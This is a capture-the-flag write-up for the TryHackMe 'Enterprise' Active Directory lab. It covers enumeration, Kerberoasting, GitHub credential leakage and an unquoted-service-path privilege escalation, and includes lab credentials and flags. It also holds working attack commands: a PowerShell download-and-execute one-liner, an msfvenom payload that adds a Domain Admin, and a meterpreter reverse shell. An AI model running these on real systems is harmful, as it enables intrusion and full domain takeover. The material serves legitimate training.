# TryHackMe — Enterprise (Summary)

**Room:** Enterprise
**Difficulty:** Hard
**Operating System:** Windows
**Made by:** @tryhackme
**Tags:** `Active Directory` `Kerberoasting` `OSINT` `GitHub` `Unquoted Service Path` `BloodHound` `Service Hijacking`

---

## ![](./assets/enterprise.png)

---

## Phase 1 — Reconnaissance

### Nmap scan

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ nmap -Pn -p- -A 10.112.151.187 -vv -oN nmap.txt
```

Key services: DNS (53), IIS (80), Kerberos (88), LDAP (389/636/3268/3269), SMB (445), WinRM (5985), Atlassian login on 7990. RDP banner leaks LAB-DC.LAB.ENTERPRISE.THM and forest root ENTERPRISE.THM.

Hosts file update:

```
10.112.151.187  LAB-DC.LAB.ENTERPRISE.THM  LAB.ENTERPRISE.THM  ENTERPRISE.THM
```

---

## Phase 2 — SMB & LDAP Enumeration

### enum4linux-ng (null session partly works)

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ enum4linux-ng 10.112.151.187 -A
```

```
[+] Appears to be root/parent DC
[+] Long domain name is: ENTERPRISE.THM
[+] SMB signing required: true
[+] Server allows authentication via username '' and password ''
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
[-] Could not get groups: STATUS_ACCESS_DENIED
[+] Found 0 shares for user '' with password ''
```

### LDAP base query

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ ldapsearch -x -H ldap://10.112.151.187 -s base namingcontexts
```

Confirmed forest structure:  
DC=ENTERPRISE,DC=THM (root)  
DC=LAB,DC=ENTERPRISE,DC=THM (child domain)

### Share enumeration trick

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u '' -p '' --shares
```

```
SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\:
SMB  10.112.151.187  445  LAB-DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

CME uses RPC/SAMR and gets blocked. smbclient uses a different code path:

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ smbclient -L //10.112.151.187 -N
```

```
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    Docs            Disk
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    SYSVOL          Disk      Logon server share
    Users           Disk      Users Share. Do Not Touch!
```

---

## Phase 3 — SMB Share Enumeration (Rabbit Holes)

### Docs share

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ smbclient //10.112.151.187/Docs -N
```

```
smb: \> ls
  RSA-Secured-Credentials.xlsx    A    15360
  RSA-Secured-Document-PII.docx   A    18432

smb: \> prompt off
smb: \> mget *
```

Files are password-protected with modern Office encryption (PBKDF2-SHA256, 100k iterations). Cracking infeasible.

### Users share

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ smbclient //10.112.151.187/Users -N
```

```
smb: \> ls
  Administrator    D
  atlbitbucket     D
  bitbucket        D
  Default          D
  LAB-ADMIN        D
  Public           D
```

Found a PowerShell history file in LAB-ADMIN:

```
echo "replication:101RepAdmin123!!" > private.txt
```

Those creds were useless.

Usernames gathered: Administrator, atlbitbucket, bitbucket, LAB-ADMIN.

---

## Phase 4 — Kerbrute & AS-REP Roasting

### User enumeration

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ /opt/kerbrute userenum --dc 10.112.151.187 -d LAB.ENTERPRISE.THM /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
[+] VALID USERNAME: banana
[+] VALID USERNAME: guest
[+] VALID USERNAME: administrator
[+] VALID USERNAME: cake
[+] VALID USERNAME: enterprise
[+] VALID USERNAME: nik
[+] VALID USERNAME: spooks
[+] VALID USERNAME: joiner
```

### AS-REP roasting attempt

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ impacket-GetNPUsers LAB.ENTERPRISE.THM/ -dc-ip 10.112.151.187 -no-pass -usersfile users.txt
```

```
[-] User banana doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nik doesn't have UF_DONT_REQUIRE_PREAUTH set
# ... (all fail)
```

Nothing roastable.

---

## Phase 5 — Web Enumeration & GitHub OSINT

Port 80 empty.  
Port 7990 shows Atlassian Bitbucket login with notice:

> “We are moving to GitHub”

Found Enterprise-THM GitHub organisation.

- Member: Nik-enterprise-dev → matches domain user **nik**
- Repository contained admin automation script
- Commit history revealed plaintext credentials:

```powershell
$userName = 'nik'
$userPassword = 'ToastyBoi!'
```

---

## Phase 6 — Credential Validation & Kerberoasting

### Validate nik

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'nik' -p 'ToastyBoi!'
```

```
SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\nik:ToastyBoi!
```

### Check RDP group

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'nik' -p 'ToastyBoi!' --groups 'Remote Desktop Users'
```

```
SMB  10.112.151.187  445  LAB-DC  LAB.ENTERPRISE.THM\bitbucket
```

bitbucket can RDP.

### Kerberoasting

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ impacket-GetUserSPNs -dc-ip 10.112.151.187 LAB.ENTERPRISE.THM/nik:ToastyBoi! -request
```

Output: SPN HTTP/LAB-DC for bitbucket.

### Crack TGS

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ hashcat -m 13100 service.hash /usr/share/wordlists/rockyou.txt
```

Password: **littleredbucket**

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'bitbucket' -p 'littleredbucket'
```

```
SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket
```

---

## Phase 7 — RDP Foothold & Flag 1

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ xfreerdp /v:10.112.151.187 /u:bitbucket /p:'littleredbucket' /d:LAB.ENTERPRISE.THM /cert:ignore /sec:nla
```

**Flag 1:** `THM{ed882d02b34246536ef7da79062bef36}`

---

## Phase 8 — BloodHound

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ bloodhound-python -u bitbucket -p 'littleredbucket' -d LAB.ENTERPRISE.THM -ns 10.112.151.187 -c All
```

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ sudo neo4j start
```

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ /opt/BloodHound-linux-x64/BloodHound --no-sandbox
```

No direct AD escalation path → need local privilege escalation.

---

## Phase 9 — Local Privilege Escalation (Unquoted Service Path)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.129.39:80/PowerUp.ps1')
Invoke-AllChecks
```

Vulnerable service:

- Unquoted path
- Writable binary
- Runs as **SYSTEM**
- Restartable

---

## Phase 10 — Service Hijack

### Method 1 — Add Domain Admin

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ msfvenom -p windows/x64/exec CMD="cmd.exe /c net user hacker Password123! /add /domain && net group \"Domain Admins\" hacker /add /domain" -f exe-service -o Zero.exe
```

Restart service → user added.

---

### Method 2 — SYSTEM Shell (Meterpreter)

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.129.39 LPORT=4444 -f exe -o 'ZeroTier One.exe'
```

Handler:

```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
run
```

Restart service → SYSTEM shell.

---

## Phase 11 — Final Flag

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'hacker' -p 'Password123!' --get-file 'C:\Users\Administrator\Desktop\system.txt' system.txt
```

**Flag 2:** `THM{1a1fa94875421296331f145971ca4881}`

---

## Closing Thoughts

GitHub OSINT → initial creds  
Kerberoasting → service account  
RDP → foothold  
Unquoted service path → SYSTEM → Domain Admin

---
